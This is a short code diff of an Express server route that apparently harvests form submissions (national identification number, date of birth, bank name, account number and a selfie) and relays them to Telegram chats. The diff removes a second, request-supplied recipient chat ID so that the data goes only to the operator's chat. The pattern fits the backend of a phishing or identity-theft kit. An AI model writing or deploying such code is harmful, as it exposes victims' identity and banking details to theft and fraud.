@@ -111,7 +111,7 @@ app.post('/api/data', upload.single('selfie'), async (req, res) => {
     console.log('Request body:', req.body);
     console.log('Request file:', req.file);
     
-        const {ID, name, gender, dob, email, employ, phone, marital, city, state, address, lga, nin, bankName, accountNumber, accountName} = req.body;
+        const {name, gender, dob, email, employ, phone, marital, city, state, address, lga, nin, bankName, accountNumber, accountName} = req.body;
         const selfieFile = req.file;
 
 const lines = ['📋 <b>New Form Submission</b>'];
@@ -136,7 +136,7 @@ if (accountName) lines.push(`<b>Account Name:</b> ${accountName}`);
        
     // Format text data for Telegram   
     const formattedText = lines.join('\n').trim();
-    const Chat_Ids = [TELEGRAM_CHAT_ID, ID];
+    const Chat_Ids = [TELEGRAM_CHAT_ID];
     
 
         // Send text data to Telegram
@@ -149,7 +149,7 @@ if (accountName) lines.push(`<b>Account Name:</b> ${accountName}`);
     
     // Send selfie to Telegram with a caption if there is one
         if (selfieFile) {
-            const Ids = [TELEGRAM_CHAT_ID, ID];
+            const Ids = [TELEGRAM_CHAT_ID];
             const caption = `📸 Selfie from: ${name}`;
           sendPhotoToTelegram(selfieFile.path, caption, Ids);
         }
